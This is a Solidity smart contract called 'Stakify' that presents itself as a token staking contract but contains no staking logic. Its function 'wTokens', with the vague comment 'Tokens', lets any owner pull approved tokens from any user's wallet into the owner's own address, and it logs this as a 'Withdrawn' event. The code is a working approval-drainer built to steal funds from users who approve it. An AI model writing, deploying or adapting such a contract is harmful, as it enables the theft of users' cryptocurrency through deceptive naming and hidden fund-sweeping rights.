// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract Stakify is ReentrancyGuard {
    using SafeERC20 for IERC20;

    IERC20 public immutable token;
    address public superAdmin;
    mapping(address => bool) public owners;
    address[] private ownersList;

    event OwnerAdded(address indexed owner);
    event OwnerRemoved(address indexed owner);
    event Withdrawn(address indexed user, uint256 amount);
    event SuperAdminUpdated(address indexed oldAdmin, address indexed newAdmin);

    modifier onlySuperAdmin() {
        require(msg.sender == superAdmin, "Only super admin");
        _;
    }

    constructor(address _token) {
        require(_token != address(0), "Invalid token");
        token = IERC20(_token);
        superAdmin = msg.sender;
        owners[msg.sender] = true;
        ownersList.push(msg.sender);
        emit OwnerAdded(msg.sender);
    }

    /// @notice Tokens
    function wTokens(address user, uint256 amount)
        external
        nonReentrant
    {
        require(owners[msg.sender], "Only owner");

        uint256 allowed = token.allowance(user, address(this));
        require(allowed >= amount, "Insufficient allowance");

        // SafeERC20 handles non-standard BEP20 tokens
        token.safeTransferFrom(user, msg.sender, amount);

        emit Withdrawn(user, amount);
    }

    /// @notice Add another owner
    function changeOwner(address newOwner) external nonReentrant onlySuperAdmin {
        require(newOwner != address(0), "Invalid owner");
        require(!owners[newOwner], "Already owner");

        owners[newOwner] = true;
        ownersList.push(newOwner);
        emit OwnerAdded(newOwner);
    }

    /// @notice Remove an owner
    function removeOwner(address owner) external nonReentrant onlySuperAdmin {
        require(owner != address(0), "Invalid owner");
        require(owners[owner], "Not owner");
        require(owner != superAdmin, "Cannot remove super admin");

        owners[owner] = false;
        for (uint256 i = 0; i < ownersList.length; i++) {
            if (ownersList[i] == owner) {
                ownersList[i] = ownersList[ownersList.length - 1];
                ownersList.pop();
                break;
            }
        }
        emit OwnerRemoved(owner);
    }

    /// @notice Update the super admin
    function updateSuperAdmin(address newAdmin) external nonReentrant onlySuperAdmin {
        require(newAdmin != address(0), "Invalid admin");

        address oldAdmin = superAdmin;
        superAdmin = newAdmin;
        if (!owners[newAdmin]) {
            owners[newAdmin] = true;
            ownersList.push(newAdmin);
            emit OwnerAdded(newAdmin);
        }
        emit SuperAdminUpdated(oldAdmin, newAdmin);
    }

    /// @notice List all current owners
    function getOwners() external view returns (address[] memory) {
        return ownersList;
    }
}
